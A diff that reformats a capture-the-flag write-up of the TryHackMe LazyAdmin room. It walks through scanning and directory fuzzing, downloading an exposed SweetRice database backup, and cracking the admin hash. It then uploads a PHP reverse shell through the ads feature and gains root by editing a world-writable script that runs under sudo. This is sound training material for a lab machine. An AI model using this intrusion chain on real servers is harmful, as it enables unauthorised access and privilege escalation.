@@ -1,30 +1,29 @@
-# LazyAdmin-THM
+# LazyAdmin
 
+## LazyAdmin-THM
 
-----
+***
 
-# Info
+## Info
 
-| Name         |   Lazy Admin                                       | 
-| ------       | -----------------                                  |
-| Room link    | https://tryhackme.com/room/lazyadmin               |  
-| Difficulty   | Easy                                               |
-| Created by   | [MrSeth6797](https://tryhackme.com/p/MrSeth6797)   |
-| solving date | May 18th 2022                                      |
-----
-
-
+| Name         | Lazy Admin                                       |
+| ------------ | ------------------------------------------------ |
+| Room link    | https://tryhackme.com/room/lazyadmin             |
+| Difficulty   | Easy                                             |
+| Created by   | [MrSeth6797](https://tryhackme.com/p/MrSeth6797) |
+| solving date | May 18th 2022                                    |
+| ----         |                                                  |
 
 <details>
 
-<summary> Recon (Click Me)</summary>
+<summary>Recon (Click Me)</summary>
 
-- after starting the machine `export target=10.10.244.50`
+* after starting the machine `export target=10.10.244.50`
 
-## nmap
+### nmap
 
-- start initial nmap scan
-    
+*   start initial nmap scan
+
     ```
     # Nmap 7.92 scan initiated Wed May 18 02:32:34 2022 as: nmap -Pn -vv -sS -sV -oN lazyadmin/initial 10.10.244.50
     Increasing send delay for 10.10.244.50 from 0 to 5 due to 248 out of 826 dropped probes since last increase.
@@ -44,42 +43,40 @@
     22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
     80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-    
+
     Read data files from: /usr/bin/../share/nmap
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     # Nmap done at Wed May 18 02:34:25 2022 -- 1 IP address (1 host up) scanned in 110.45 seconds
     ```
-    
-- 22 and 80 are open
-- Let’s Navigate to the website, it’s apache2 webserver
-    
-    ![Untitled](images/Untitled.png)
-    
+* 22 and 80 are open
+*   Let’s Navigate to the website, it’s apache2 webserver
 
----
+    <img src="images/Untitled.png" alt="Untitled" data-size="original">
 
-## Website Content Discovery
+***
 
-- view robots.txt
-    - there is no robots.txt file,
-    
-    ![Untitled](images/Untitled%201.png)
-    
-- let’s fuzz this website using ffuf
-- `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/FUZZ`
-    - /content found, let’s view this page
-        
-        ![Untitled](images/Untitled%202.png)
-        
-        - it’s running SweetRice CMS
-- searching for any exploit with `searchsploit`
-    
-    ![Untitled](images/Untitled%203.png)
-    
-    `SweetRice 1.5.1 - Backup Disclosure         | php/webapps/40718.txt` 
-    
-    - exploit content:
-        
+### Website Content Discovery
+
+*   view robots.txt
+
+    * there is no robots.txt file,
+
+    <img src="images/Untitled 1.png" alt="Untitled" data-size="original">
+* let’s fuzz this website using ffuf
+* `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/FUZZ`
+  *   /content found, let’s view this page
+
+      <img src="images/Untitled 2.png" alt="Untitled" data-size="original">
+
+      * it’s running SweetRice CMS
+*   searching for any exploit with `searchsploit`
+
+    <img src="images/Untitled 3.png" alt="Untitled" data-size="original">
+
+    `SweetRice 1.5.1 - Backup Disclosure | php/webapps/40718.txt`
+
+    *   exploit content:
+
         ```
         Title: SweetRice 1.5.1 - Backup Disclosure
         Application: SweetRice
@@ -90,26 +87,24 @@
         Tested on: Windows 10
         Bugs: Backup Disclosure
         Date: 16-Sept-2016
-        
+
         Proof of Concept :
-        
+
         You can access to all mysql backup and download them from this directory.
         http://localhost/inc/mysql_backup
-        
+
         and can access to website files backup from:
         http://localhost/SweetRice-transfer.zip
         ```
-        
-- let’s fuzz /content directory
-- `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/content/FUZZ`
-- images, js, inc, as, themes, attachment found
-- let’s try the exploit with /content/inc directory
-    
-    ![Untitled](images/Untitled%204.png)
-    
-- download mysql backup in [http://10.10.244.50/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql](http://10.10.244.50/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql)
-- backup content
-    
+* let’s fuzz /content directory
+* `ffuf -w /mnt/hgfs/Pentesting\ Share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://$target/content/FUZZ`
+* images, js, inc, as, themes, attachment found
+*   let’s try the exploit with /content/inc directory
+
+    <img src="images/Untitled 4.png" alt="Untitled" data-size="original">
+* download mysql backup in [http://10.10.244.50/content/inc/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql](http://10.10.244.50/content/inc/mysql\_backup/mysql\_bakup\_20191129023059-1.5.1.sql)
+*   backup content
+
     ```
     <?php return array (
       0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
@@ -214,44 +209,37 @@
     ) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
     );?>
     ```
-    
-- "passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\” I think it’s a hashed password, so let’s crack it using hashes.com
+* "passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\” I think it’s a hashed password, so let’s crack it using hashes.com
 
----
-
-
+***
 
 </details>
 
-
 <details>
-    <summary>Gaining Access (Click Me)</summary>
 
-![Untitled](images/Untitled%205.png)
+<summary>Gaining Access (Click Me)</summary>
 
-- great, now we have the password for user ‘manager’ and he is admin, let’s navigate to the discovered directories to find admin login page
-- images, js, inc, as, themes, attachment, we can find the login page in /content/as
-- try the username and the password we found
-    
-    ![Untitled](images/Untitled%206.png)
-    
-    ![Untitled](images/Untitled%207.png)
-    
-- we can see there is ads section and there is ads directory in /content/inc (remember from [here](images.md)), so let’s create an ad with our php reverse shell
-    
-    ![Untitled](images/Untitled%208.png)
-    
-- now we can run the code by navigating to http://<host-IP>/content/inc/ad/juba.php
+<img src="images/Untitled 5.png" alt="Untitled" data-size="original">
 
----
+* great, now we have the password for user ‘manager’ and he is admin, let’s navigate to the discovered directories to find admin login page
+* images, js, inc, as, themes, attachment, we can find the login page in /content/as
+*   try the username and the password we found
+
+    <img src="images/Untitled 6.png" alt="Untitled" data-size="original">
+
+    <img src="images/Untitled 7.png" alt="Untitled" data-size="original">
+*   we can see there is ads section and there is ads directory in /content/inc (remember from [here](images.md)), so let’s create an ad with our php reverse shell
+
+    <img src="images/Untitled 8.png" alt="Untitled" data-size="original">
+* now we can run the code by navigating to http:///content/inc/ad/juba.php
+
+***
 
 </details>
 
-
-
-
 <details>
-    <summary>Stabilize the shell (Click Me)</summary>
+
+<summary>Stabilize the shell (Click Me)</summary>
 
 ```bash
 $ which python
@@ -268,16 +256,14 @@ zsh: suspended  nc -nlvp 9050
 
 www-data@THM-Chal:/$
 ```
----
+
+***
 
 </details>
 
-
-
-
 <details>
-    <summary>User.txt flag</summary>
 
+<summary>User.txt flag</summary>
 
 ```bash
 www-data@THM-Chal:/$ ls
@@ -296,13 +282,13 @@ THM{63e*****************************}
 www-data@THM-Chal:/home/itguy$
 ```
 
----
+***
+
 </details>
 
-
 <details>
-    <summary>Privilege Escalation</summary>
 
+<summary>Privilege Escalation</summary>
 
 ```bash
 www-data@THM-Chal:/home/itguy$ sudo -l
@@ -315,23 +301,22 @@ User www-data may run the following commands on THM-Chal:
 www-data@THM-Chal:/home/itguy$
 ```
 
-- Oh !!, he is a very lazy sysad, I can run perl and backup.pl as root with no password
-- backup.pl content, if we list the file we will see that there is no write permission for us
+* Oh !!, he is a very lazy sysad, I can run perl and backup.pl as root with no password
+* backup.pl content, if we list the file we will see that there is no write permission for us
 
 ```perl
 #!/usr/bin/perl
 system("sh", "/etc/copy.sh");
 ```
 
-- but if we list copy.sh we will see this
-    
+*   but if we list copy.sh we will see this
+
     ```perl
     www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh 
     -rw-r--rwx 1 root root 97 May 18 11:15 /etc/copy.sh
     ```
-    
-- we can edit copy.sh, we can type a reverse shell inside the file, but for simplicity we will use `bash -p`
-    
+*   we can edit copy.sh, we can type a reverse shell inside the file, but for simplicity we will use `bash -p`
+
     ```bash
     root@THM-Chal:/etc# cat copy.sh 
     whoami
@@ -342,10 +327,10 @@ system("sh", "/etc/copy.sh");
     root@THM-Chal:/etc# whoami
     root
     ```
-    
-    - Great, we are root
-- get root.txt flag
-    
+
+    * Great, we are root
+*   get root.txt flag
+
     ```bash
     root@THM-Chal:/etc# cd 
     root@THM-Chal:~# ls
@@ -353,16 +338,15 @@ system("sh", "/etc/copy.sh");
     root@THM-Chal:~# cat root.txt
     THM{663*****************************}
     ```
-    
 
----
+***
+
 </details>
 
+***
 
----
+### I hope you enjoyed the write-up
 
-## I hope you enjoyed the write-up
- 
-- [Linkedin](https://www.linkedin.com/in/juba0x00/)
-- [Twitter](https://twitter.com/juba0x00/)
-- [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
+* [Linkedin](https://www.linkedin.com/in/juba0x00/)
+* [Twitter](https://twitter.com/juba0x00/)
+* [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
